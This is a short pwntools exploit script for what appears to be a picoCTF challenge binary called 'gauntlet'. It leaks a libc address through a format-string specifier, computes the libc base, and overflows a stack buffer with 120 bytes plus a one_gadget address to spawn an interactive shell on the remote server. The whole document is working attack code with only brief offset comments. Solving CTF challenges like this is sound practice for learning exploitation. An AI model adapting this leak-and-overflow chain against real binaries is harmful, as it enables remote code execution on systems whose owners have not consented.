from pwn import *

context.binary = elf = ELF("./gauntlet", checksec=False)
libc = ELF("libc-2.27.so")

if args.LOCAL:
    p = process(elf.path)
else:
    p = remote('wily-courier.picoctf.net', 63442)

libc_start_call_main = libc.sym['__libc_start_main']
p.sendline('%23$p')

libc.address = int(p.recvline().strip(), 16) - libc_start_call_main - 0xe7
log.success(f"Leak Libc: {hex(libc.address)}")

# 0x78d10d875c87 = 0xc87 
# 0x0000000000021ba0 = 0xba0
# 0xc87 - 0xba0 =  0xe7

ONE_GADGET = libc.address + 0x4f302

pay = b"A" * 120
pay += p64(ONE_GADGET)

p.sendline(pay)

p.interactive()